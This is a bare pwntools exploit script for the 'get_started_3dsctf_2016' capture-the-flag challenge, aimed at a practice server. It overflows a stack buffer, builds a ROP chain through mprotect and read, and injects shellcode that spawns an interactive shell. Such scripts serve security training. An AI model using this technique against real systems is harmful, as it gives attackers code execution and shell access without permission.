from pwn import *
context.log_level = 'debug'
#io = process('./get_started_3dsctf_2016')
io = remote('node4.buuoj.cn',27103)
elf = ELF('./get_started_3dsctf_2016')

mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']
pop3_ret = 0x804951D
flag_addr = 0x080489A0


mem_addr = 0x80EB000
mem_size = 0x1000
mem_proc = 0x7


payload = (0x38) * b'a' + p32(mprotect_addr) +p32(pop3_ret) + p32(mem_addr) + p32(mem_size) + p32(mem_proc)

payload += p32(read_addr) + p32(pop3_ret) + p32(0) + p32(mem_addr) + p32(0x100)

payload += p32(mem_addr)

io.sendline(payload)
payload = asm(shellcraft.sh())
io.sendline(payload)
io.interactive()
